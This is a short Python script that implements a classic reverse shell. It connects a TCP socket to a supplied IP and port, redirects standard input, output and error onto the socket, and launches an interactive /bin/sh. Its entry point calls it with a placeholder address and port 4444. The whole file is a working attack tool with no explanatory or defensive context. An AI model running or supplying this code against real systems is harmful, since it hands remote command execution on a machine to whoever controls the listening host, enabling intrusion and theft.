import socket
import subprocess
import os


def get_reverse_shell(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["/bin/sh", "-i"])


if __name__ == "__main__":
    get_reverse_shell("your.target.ip.here", 4444) 